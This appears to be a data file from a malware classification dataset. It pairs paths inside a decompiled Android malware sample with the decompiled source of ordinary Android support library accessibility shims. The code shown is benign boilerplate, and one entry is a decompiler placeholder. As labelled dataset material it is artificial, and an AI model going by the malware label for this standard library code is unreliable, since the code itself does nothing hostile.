"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityManagerStubImpl.code","static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {   AccessibilityManagerStubImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat listener){     return null;   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return false;   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return Collections.emptyList();   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return Collections.emptyList();   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityManagerVersionImpl.code","interface AccessibilityManagerVersionImpl {   boolean addAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager accessibilityManager,  int i);   List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager accessibilityManager);   boolean isTouchExplorationEnabled(  AccessibilityManager accessibilityManager);   Object newAccessiblityStateChangeListener(  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   boolean removeAccessibilityStateChangeListener(  AccessibilityManager accessibilityManager,  AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoBridge.code","interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } interface AccessibilityNodeInfoBridge {   Object createAccessibilityNodeInfo(  int i);   List<Object> findAccessibilityNodeInfosByText(  String str,  int i);   Object findFocus(  int i);   boolean performAction(  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5fe6f303"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatIcs.code","class AccessibilityNodeInfoCompatIcs {   AccessibilityNodeInfoCompatIcs(){   }   public static Object obtain(){     return AccessibilityNodeInfo.obtain();   }   public static Object obtain(  View source){     return AccessibilityNodeInfo.obtain(source);   }   public static Object obtain(  Object info){     return AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)info);   }   public static void addAction(  Object info,  int action){     ((AccessibilityNodeInfo)info).addAction(action);   }   public static void addChild(  Object info,  View child){     ((AccessibilityNodeInfo)info).addChild(child);   }   public static List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     List result=((AccessibilityNodeInfo)info).findAccessibilityNodeInfosByText(text);     return result;   }   public static int getActions(  Object info){     return ((AccessibilityNodeInfo)info).getActions();   }   public static void getBoundsInParent(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInParent(outBounds);   }   public static void getBoundsInScreen(  Object info,  Rect outBounds){     ((AccessibilityNodeInfo)info).getBoundsInScreen(outBounds);   }   public static Object getChild(  Object info,  int index){     return ((AccessibilityNodeInfo)info).getChild(index);   }   public static int getChildCount(  Object info){     return ((AccessibilityNodeInfo)info).getChildCount();   }   public static CharSequence getClassName(  Object info){     return ((AccessibilityNodeInfo)info).getClassName();   }   public static CharSequence getContentDescription(  Object info){     return ((AccessibilityNodeInfo)info).getContentDescription();   }   public static CharSequence getPackageName(  Object info){     return ((AccessibilityNodeInfo)info).getPackageName();   }   public static Object getParent(  Object info){     return ((AccessibilityNodeInfo)info).getParent();   }   public static CharSequence getText(  Object info){     return ((AccessibilityNodeInfo)info).getText();   }   public static int getWindowId(  Object info){     return ((AccessibilityNodeInfo)info).getWindowId();   }   public static boolean isCheckable(  Object info){     return ((AccessibilityNodeInfo)info).isCheckable();   }   public static boolean isChecked(  Object info){     return ((AccessibilityNodeInfo)info).isChecked();   }   public static boolean isClickable(  Object info){     return ((AccessibilityNodeInfo)info).isClickable();   }   public static boolean isEnabled(  Object info){     return ((AccessibilityNodeInfo)info).isEnabled();   }   public static boolean isFocusable(  Object info){     return ((AccessibilityNodeInfo)info).isFocusable();   }   public static boolean isFocused(  Object info){     return ((AccessibilityNodeInfo)info).isFocused();   }   public static boolean isLongClickable(  Object info){     return ((AccessibilityNodeInfo)info).isLongClickable();   }   public static boolean isPassword(  Object info){     return ((AccessibilityNodeInfo)info).isPassword();   }   public static boolean isScrollable(  Object info){     return ((AccessibilityNodeInfo)info).isScrollable();   }   public static boolean isSelected(  Object info){     return ((AccessibilityNodeInfo)info).isSelected();   }   public static boolean performAction(  Object info,  int action){     return ((AccessibilityNodeInfo)info).performAction(action);   }   public static void setBoundsInParent(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInParent(bounds);   }   public static void setBoundsInScreen(  Object info,  Rect bounds){     ((AccessibilityNodeInfo)info).setBoundsInScreen(bounds);   }   public static void setCheckable(  Object info,  boolean checkable){     ((AccessibilityNodeInfo)info).setCheckable(checkable);   }   public static void setChecked(  Object info,  boolean checked){     ((AccessibilityNodeInfo)info).setChecked(checked);   }   public static void setClassName(  Object info,  CharSequence className){     ((AccessibilityNodeInfo)info).setClassName(className);   }   public static void setClickable(  Object info,  boolean clickable){     ((AccessibilityNodeInfo)info).setClickable(clickable);   }   public static void setContentDescription(  Object info,  CharSequence contentDescription){     ((AccessibilityNodeInfo)info).setContentDescription(contentDescription);   }   public static void setEnabled(  Object info,  boolean enabled){     ((AccessibilityNodeInfo)info).setEnabled(enabled);   }   public static void setFocusable(  Object info,  boolean focusable){     ((AccessibilityNodeInfo)info).setFocusable(focusable);   }   public static void setFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setFocused(focused);   }   public static void setLongClickable(  Object info,  boolean longClickable){     ((AccessibilityNodeInfo)info).setLongClickable(longClickable);   }   public static void setPackageName(  Object info,  CharSequence packageName){     ((AccessibilityNodeInfo)info).setPackageName(packageName);   }   public static void setParent(  Object info,  View parent){     ((AccessibilityNodeInfo)info).setParent(parent);   }   public static void setPassword(  Object info,  boolean password){     ((AccessibilityNodeInfo)info).setPassword(password);   }   public static void setScrollable(  Object info,  boolean scrollable){     ((AccessibilityNodeInfo)info).setScrollable(scrollable);   }   public static void setSelected(  Object info,  boolean selected){     ((AccessibilityNodeInfo)info).setSelected(selected);   }   public static void setSource(  Object info,  View source){     ((AccessibilityNodeInfo)info).setSource(source);   }   public static void setText(  Object info,  CharSequence text){     ((AccessibilityNodeInfo)info).setText(text);   }   public static void recycle(  Object info){     ((AccessibilityNodeInfo)info).recycle();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellyBean.code","class AccessibilityNodeInfoCompatJellyBean {   AccessibilityNodeInfoCompatJellyBean(){   }   public static void addChild(  Object info,  View child,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).addChild(child,virtualDescendantId);   }   public static void setSource(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setSource(root,virtualDescendantId);   }   public static boolean isVisibleToUser(  Object info){     return ((AccessibilityNodeInfo)info).isVisibleToUser();   }   public static void setVisibleToUser(  Object info,  boolean visibleToUser){     ((AccessibilityNodeInfo)info).setVisibleToUser(visibleToUser);   }   public static boolean performAction(  Object info,  int action,  Bundle arguments){     return ((AccessibilityNodeInfo)info).performAction(action,arguments);   }   public static void setMovementGranularities(  Object info,  int granularities){     ((AccessibilityNodeInfo)info).setMovementGranularities(granularities);   }   public static int getMovementGranularities(  Object info){     return ((AccessibilityNodeInfo)info).getMovementGranularities();   }   public static Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfo.obtain(root,virtualDescendantId);   }   public static Object findFocus(  Object info,  int focus){     return ((AccessibilityNodeInfo)info).findFocus(focus);   }   public static Object focusSearch(  Object info,  int direction){     return ((AccessibilityNodeInfo)info).focusSearch(direction);   }   public static void setParent(  Object info,  View root,  int virtualDescendantId){     ((AccessibilityNodeInfo)info).setParent(root,virtualDescendantId);   }   public static boolean isAccessibilityFocused(  Object info){     return ((AccessibilityNodeInfo)info).isAccessibilityFocused();   }   public static void setAccesibilityFocused(  Object info,  boolean focused){     ((AccessibilityNodeInfo)info).setAccessibilityFocused(focused);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatJellybeanMr2.code","class AccessibilityNodeInfoCompatJellybeanMr2 {   AccessibilityNodeInfoCompatJellybeanMr2(){   }   public static void setViewIdResourceName(  Object info,  String viewId){     ((AccessibilityNodeInfo)info).setViewIdResourceName(viewId);   }   public static String getViewIdResourceName(  Object info){     return ((AccessibilityNodeInfo)info).getViewIdResourceName();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoCompatKitKat.code","class AccessibilityNodeInfoCompatKitKat {   AccessibilityNodeInfoCompatKitKat(){   }   public static int getLiveRegion(  Object info){     return ((AccessibilityNodeInfo)info).getLiveRegion();   }   public static void setLiveRegion(  Object info,  int mode){     ((AccessibilityNodeInfo)info).setLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoIcsImpl.code","static class AccessibilityNodeInfoIcsImpl extends AccessibilityNodeInfoStubImpl {   AccessibilityNodeInfoIcsImpl(){   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View source){     return AccessibilityNodeInfoCompatIcs.obtain(source);   }   @Override public Object obtain(  Object info){     return AccessibilityNodeInfoCompatIcs.obtain(info);   }   @Override public void addAction(  Object info,  int action){     AccessibilityNodeInfoCompatIcs.addAction(info,action);   }   @Override public void addChild(  Object info,  View child){     AccessibilityNodeInfoCompatIcs.addChild(info,child);   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return AccessibilityNodeInfoCompatIcs.findAccessibilityNodeInfosByText(info,text);   }   @Override public int getActions(  Object info){     return AccessibilityNodeInfoCompatIcs.getActions(info);   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInParent(info,outBounds);   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){     AccessibilityNodeInfoCompatIcs.getBoundsInScreen(info,outBounds);   }   @Override public Object getChild(  Object info,  int index){     return AccessibilityNodeInfoCompatIcs.getChild(info,index);   }   @Override public int getChildCount(  Object info){     return AccessibilityNodeInfoCompatIcs.getChildCount(info);   }   @Override public CharSequence getClassName(  Object info){     return AccessibilityNodeInfoCompatIcs.getClassName(info);   }   @Override public CharSequence getContentDescription(  Object info){     return AccessibilityNodeInfoCompatIcs.getContentDescription(info);   }   @Override public CharSequence getPackageName(  Object info){     return AccessibilityNodeInfoCompatIcs.getPackageName(info);   }   @Override public Object getParent(  Object info){     return AccessibilityNodeInfoCompatIcs.getParent(info);   }   @Override public CharSequence getText(  Object info){     return AccessibilityNodeInfoCompatIcs.getText(info);   }   @Override public int getWindowId(  Object info){     return AccessibilityNodeInfoCompatIcs.getWindowId(info);   }   @Override public boolean isCheckable(  Object info){     return AccessibilityNodeInfoCompatIcs.isCheckable(info);   }   @Override public boolean isChecked(  Object info){     return AccessibilityNodeInfoCompatIcs.isChecked(info);   }   @Override public boolean isClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isClickable(info);   }   @Override public boolean isEnabled(  Object info){     return AccessibilityNodeInfoCompatIcs.isEnabled(info);   }   @Override public boolean isFocusable(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocusable(info);   }   @Override public boolean isFocused(  Object info){     return AccessibilityNodeInfoCompatIcs.isFocused(info);   }   @Override public boolean isLongClickable(  Object info){     return AccessibilityNodeInfoCompatIcs.isLongClickable(info);   }   @Override public boolean isPassword(  Object info){     return AccessibilityNodeInfoCompatIcs.isPassword(info);   }   @Override public boolean isScrollable(  Object info){     return AccessibilityNodeInfoCompatIcs.isScrollable(info);   }   @Override public boolean isSelected(  Object info){     return AccessibilityNodeInfoCompatIcs.isSelected(info);   }   @Override public boolean performAction(  Object info,  int action){     return AccessibilityNodeInfoCompatIcs.performAction(info,action);   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(info,bounds);   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(info,bounds);   }   @Override public void setCheckable(  Object info,  boolean checkable){     AccessibilityNodeInfoCompatIcs.setCheckable(info,checkable);   }   @Override public void setChecked(  Object info,  boolean checked){     AccessibilityNodeInfoCompatIcs.setChecked(info,checked);   }   @Override public void setClassName(  Object info,  CharSequence className){     AccessibilityNodeInfoCompatIcs.setClassName(info,className);   }   @Override public void setClickable(  Object info,  boolean clickable){     AccessibilityNodeInfoCompatIcs.setClickable(info,clickable);   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){     AccessibilityNodeInfoCompatIcs.setContentDescription(info,contentDescription);   }   @Override public void setEnabled(  Object info,  boolean enabled){     AccessibilityNodeInfoCompatIcs.setEnabled(info,enabled);   }   @Override public void setFocusable(  Object info,  boolean focusable){     AccessibilityNodeInfoCompatIcs.setFocusable(info,focusable);   }   @Override public void setFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatIcs.setFocused(info,focused);   }   @Override public void setLongClickable(  Object info,  boolean longClickable){     AccessibilityNodeInfoCompatIcs.setLongClickable(info,longClickable);   }   @Override public void setPackageName(  Object info,  CharSequence packageName){     AccessibilityNodeInfoCompatIcs.setPackageName(info,packageName);   }   @Override public void setParent(  Object info,  View parent){     AccessibilityNodeInfoCompatIcs.setParent(info,parent);   }   @Override public void setPassword(  Object info,  boolean password){     AccessibilityNodeInfoCompatIcs.setPassword(info,password);   }   @Override public void setScrollable(  Object info,  boolean scrollable){     AccessibilityNodeInfoCompatIcs.setScrollable(info,scrollable);   }   @Override public void setSelected(  Object info,  boolean selected){     AccessibilityNodeInfoCompatIcs.setSelected(info,selected);   }   @Override public void setSource(  Object info,  View source){     AccessibilityNodeInfoCompatIcs.setSource(info,source);   }   @Override public void setText(  Object info,  CharSequence text){     AccessibilityNodeInfoCompatIcs.setText(info,text);   }   @Override public void recycle(  Object info){     AccessibilityNodeInfoCompatIcs.recycle(info);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoImpl.code","public interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getLiveRegion(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   String getViewIdResourceName(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLiveRegion(  Object obj,  int i);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setViewIdResourceName(  Object obj,  String str);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanImpl.code","static class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return AccessibilityNodeInfoCompatJellyBean.obtain(root,virtualDescendantId);   }   @Override public Object findFocus(  Object info,  int focus){     return AccessibilityNodeInfoCompatJellyBean.findFocus(info,focus);   }   @Override public Object focusSearch(  Object info,  int direction){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(info,direction);   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.addChild(info,child,virtualDescendantId);   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setSource(info,root,virtualDescendantId);   }   @Override public boolean isVisibleToUser(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(info);   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(info,visibleToUser);   }   @Override public boolean isAccessibilityFocused(  Object info){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(info);   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(info,focused);   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return AccessibilityNodeInfoCompatJellyBean.performAction(info,action,arguments);   }   @Override public void setMovementGranularities(  Object info,  int granularities){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(info,granularities);   }   @Override public int getMovementGranularities(  Object info){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(info);   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){     AccessibilityNodeInfoCompatJellyBean.setParent(info,root,virtualDescendantId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoJellybeanMr2Impl.code","static class AccessibilityNodeInfoJellybeanMr2Impl extends AccessibilityNodeInfoJellybeanImpl {   AccessibilityNodeInfoJellybeanMr2Impl(){   }   @Override public String getViewIdResourceName(  Object info){     return AccessibilityNodeInfoCompatJellybeanMr2.getViewIdResourceName(info);   }   @Override public void setViewIdResourceName(  Object info,  String viewId){     AccessibilityNodeInfoCompatJellybeanMr2.setViewIdResourceName(info,viewId);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoKitKatImpl.code","static class AccessibilityNodeInfoKitKatImpl extends AccessibilityNodeInfoJellybeanMr2Impl {   AccessibilityNodeInfoKitKatImpl(){   }   @Override public int getLiveRegion(  Object info){     return AccessibilityNodeInfoCompatKitKat.getLiveRegion(info);   }   @Override public void setLiveRegion(  Object info,  int mode){     AccessibilityNodeInfoCompatKitKat.setLiveRegion(info,mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeInfoStubImpl.code","static class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View source){     return null;   }   @Override public Object obtain(  View root,  int virtualDescendantId){     return null;   }   @Override public Object obtain(  Object info){     return null;   }   @Override public void addAction(  Object info,  int action){   }   @Override public void addChild(  Object info,  View child){   }   @Override public void addChild(  Object info,  View child,  int virtualDescendantId){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object info,  String text){     return Collections.emptyList();   }   @Override public int getActions(  Object info){     return 0;   }   @Override public void getBoundsInParent(  Object info,  Rect outBounds){   }   @Override public void getBoundsInScreen(  Object info,  Rect outBounds){   }   @Override public Object getChild(  Object info,  int index){     return null;   }   @Override public int getChildCount(  Object info){     return 0;   }   @Override public CharSequence getClassName(  Object info){     return null;   }   @Override public CharSequence getContentDescription(  Object info){     return null;   }   @Override public CharSequence getPackageName(  Object info){     return null;   }   @Override public Object getParent(  Object info){     return null;   }   @Override public CharSequence getText(  Object info){     return null;   }   @Override public int getWindowId(  Object info){     return 0;   }   @Override public boolean isCheckable(  Object info){     return false;   }   @Override public boolean isChecked(  Object info){     return false;   }   @Override public boolean isClickable(  Object info){     return false;   }   @Override public boolean isEnabled(  Object info){     return false;   }   @Override public boolean isFocusable(  Object info){     return false;   }   @Override public boolean isFocused(  Object info){     return false;   }   @Override public boolean isVisibleToUser(  Object info){     return false;   }   @Override public boolean isAccessibilityFocused(  Object info){     return false;   }   @Override public boolean isLongClickable(  Object info){     return false;   }   @Override public boolean isPassword(  Object info){     return false;   }   @Override public boolean isScrollable(  Object info){     return false;   }   @Override public boolean isSelected(  Object info){     return false;   }   @Override public boolean performAction(  Object info,  int action){     return false;   }   @Override public boolean performAction(  Object info,  int action,  Bundle arguments){     return false;   }   @Override public void setMovementGranularities(  Object info,  int granularities){   }   @Override public int getMovementGranularities(  Object info){     return 0;   }   @Override public void setBoundsInParent(  Object info,  Rect bounds){   }   @Override public void setBoundsInScreen(  Object info,  Rect bounds){   }   @Override public void setCheckable(  Object info,  boolean checkable){   }   @Override public void setChecked(  Object info,  boolean checked){   }   @Override public void setClassName(  Object info,  CharSequence className){   }   @Override public void setClickable(  Object info,  boolean clickable){   }   @Override public void setContentDescription(  Object info,  CharSequence contentDescription){   }   @Override public void setEnabled(  Object info,  boolean enabled){   }   @Override public void setFocusable(  Object info,  boolean focusable){   }   @Override public void setFocused(  Object info,  boolean focused){   }   @Override public void setVisibleToUser(  Object info,  boolean visibleToUser){   }   @Override public void setAccessibilityFocused(  Object info,  boolean focused){   }   @Override public void setLongClickable(  Object info,  boolean longClickable){   }   @Override public void setPackageName(  Object info,  CharSequence packageName){   }   @Override public void setParent(  Object info,  View parent){   }   @Override public void setPassword(  Object info,  boolean password){   }   @Override public void setScrollable(  Object info,  boolean scrollable){   }   @Override public void setSelected(  Object info,  boolean selected){   }   @Override public void setSource(  Object info,  View source){   }   @Override public void setSource(  Object info,  View root,  int virtualDescendantId){   }   @Override public Object findFocus(  Object info,  int focus){     return null;   }   @Override public Object focusSearch(  Object info,  int direction){     return null;   }   @Override public void setText(  Object info,  CharSequence text){   }   @Override public void recycle(  Object info){   }   @Override public void setParent(  Object info,  View root,  int virtualDescendantId){   }   @Override public String getViewIdResourceName(  Object info){     return null;   }   @Override public void setViewIdResourceName(  Object info,  String viewId){   }   @Override public int getLiveRegion(  Object info){     return 0;   }   @Override public void setLiveRegion(  Object info,  int mode){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } static class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat compat){       return null;     }   } static class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderKitKatImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat compat){       return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){         @Override public boolean performAction(        int virtualViewId,        int action,        Bundle arguments){           return compat.performAction(virtualViewId,action,arguments);         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String text,        int virtualViewId){           List<AccessibilityNodeInfoCompat> compatInfos=compat.findAccessibilityNodeInfosByText(text,virtualViewId);           List<Object> infos=new ArrayList<>();           int infoCount=compatInfos.size();           for (int i=0; i < infoCount; i++) {             AccessibilityNodeInfoCompat infoCompat=compatInfos.get(i);             infos.add(infoCompat.getInfo());           }           return infos;         }         @Override public Object createAccessibilityNodeInfo(        int virtualViewId){           AccessibilityNodeInfoCompat compatInfo=compat.createAccessibilityNodeInfo(virtualViewId);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }         @Override public Object findFocus(        int focus){           AccessibilityNodeInfoCompat compatInfo=compat.findFocus(focus);           if (compatInfo == null) {             return null;           }           return compatInfo.getInfo();         }       } );     }   } static {     if (Build.VERSION.SDK_INT >= 19) {       IMPL=new AccessibilityNodeProviderKitKatImpl();     }  else     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object provider){     this.mProvider=provider;   }   public Object getProvider(){     return this.mProvider;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int virtualViewId){     return null;   }   public boolean performAction(  int virtualViewId,  int action,  Bundle arguments){     return false;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String text,  int virtualViewId){     return null;   }   public AccessibilityNodeInfoCompat findFocus(  int focus){     return null;   } } "
